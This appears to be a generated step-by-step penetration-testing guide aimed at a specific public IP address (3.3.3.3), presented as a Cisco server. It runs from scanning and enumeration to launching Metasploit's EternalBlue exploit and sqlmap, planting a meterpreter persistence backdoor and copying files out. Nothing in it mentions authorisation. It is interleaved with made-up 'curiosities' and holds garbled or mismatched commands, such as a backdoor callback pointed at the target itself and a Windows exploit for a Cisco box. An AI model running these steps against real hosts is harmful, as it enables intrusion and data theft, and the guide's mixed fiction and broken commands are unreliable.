Title: Comprehensive Penetration Testing Protocol for Cisco Server at IP 3.3.3.3

Introduction: Penetration testing, or pentesting, is a crucial process for identifying and addressing security vulnerabilities in a network. This guide outlines the steps and commands necessary to perform a thorough pentest on the IP address 3.3.3.3, which is assumed to be a Cisco server. Along the way, we’ll uncover some interesting (and fictional) facts about this server.

Step 1: Reconnaissance

Objective: Gather as much information as possible about the target.

Ping the Target:
Command: ping 3.3.3.3
Purpose: Check if the server is reachable and measure the response time.
DNS Lookup:
Command: nslookup 3.3.3.3
Purpose: Obtain domain name information associated with the IP address.
WHOIS Lookup:
Command: whois 3.3.3.3
Purpose: Retrieve registration details and ownership information.
Curiosity: Legend has it that the server at 3.3.3.3 was once part of a secret project by Cisco to develop an AI capable of predicting network failures before they happen.

Step 2: Scanning

Objective: Identify open ports and services running on the target.

Nmap Scan:
Command: nmap -sS -p- 3.3.3.3
Purpose: Perform a TCP SYN scan on all ports to identify open ports.
Service Version Detection:
Command: nmap -sV 3.3.3.3
Purpose: Determine the versions of services running on open ports.
Operating System Detection:
Command: nmap -O 3.3.3.3
Purpose: Identify the operating system of the target server.
Curiosity: The server is rumored to have a hidden port that only opens during a full moon, allowing access to a secret configuration panel.

Step 3: Enumeration

Objective: Gather detailed information about the services and potential vulnerabilities.

Banner Grabbing:
Command: nc -v 3.3.3.3 80
Purpose: Retrieve the banner of the web server running on port 80.
SNMP Enumeration:
Command: snmpwalk -v2c -c public 3.3.3.3
Purpose: Enumerate SNMP information if the service is running.
SMB Enumeration:
Command: enum4linux -a 3.3.3.3
Purpose: Enumerate SMB shares and users.
Curiosity: It’s said that the server’s SNMP community string, “public,” was chosen because it was the name of the project’s mascot, a friendly octopus named Public.

Step 4: Vulnerability Analysis

Objective: Identify vulnerabilities in the services running on the target.

Nmap Vulnerability Scan:
Command: nmap --script vuln 3.3.3.3
Purpose: Use Nmap scripts to identify known vulnerabilities.
Nikto Web Server Scan:
Command: nikto -h 3.3.3.3
Purpose: Scan the web server for common vulnerabilities.
OpenVAS Scan:
Command: openvas-start && openvasmd --rebuild && openvasmd --update && openvasmd --progress && openvas-cli -h 3.3.3.3
Purpose: Perform a comprehensive vulnerability scan using OpenVAS.
Curiosity: The server’s web interface once displayed a hidden Easter egg: a mini-game where users could play as a network packet navigating through firewalls.

Step 5: Exploitation

Objective: Exploit identified vulnerabilities to gain access.

Metasploit Framework:
Command: msfconsole
Purpose: Launch Metasploit for exploitation.
Example: use exploit/windows/smb/ms17_010_eternalblue
Set target: set RHOST 3.3.3.3
Execute: run
Manual Exploitation:
Command: Varies based on vulnerability.
Example: Exploiting a vulnerable web application using SQL injection.
Command: sqlmap -u "http://3.3.3.3/vulnerable_page.php?id=1" --dbs
Curiosity: The server’s firewall is said to be guarded by a virtual dragon, which only allows packets through if they answer a riddle correctly.

Step 6: Post-Exploitation

Objective: Gather further information and maintain access.

Privilege Escalation:
Command: linuxprivchecker.py (for Linux) or windows-exploit-suggester.py (for Windows)
Purpose: Identify potential privilege escalation vectors.
Persistence:
Command: meterpreter > run persistence -U -i 5 -p 4444 -r 3.3.3.3
Purpose: Set up a persistent backdoor.
Data Exfiltration:
Command: scp user@3.3.3.3:/path/to/important/file /local/path
Purpose: Securely copy important files from the target.
Curiosity: The server’s logs are rumored to be monitored by an AI named “Watcher,” which alerts the admin if any unusual activity is detected.

Step 7: Reporting

Objective: Document findings and provide recommendations.

Generate Report:
Command: dradis or reporting tool of choice
Purpose: Compile all findings into a comprehensive report.
Recommendations:
Include detailed remediation steps for each identified vulnerability.
Curiosity: The final report is traditionally signed off with a digital seal of approval from the project’s mascot, Public the octopus.

By following these steps, you can conduct a thorough penetration test on the IP address 3.3.3.3, uncovering potential vulnerabilities and ensuring the security of the Cisco server. Remember, the key to a successful pentest is not just finding vulnerabilities but also providing actionable recommendations to mitigate them.
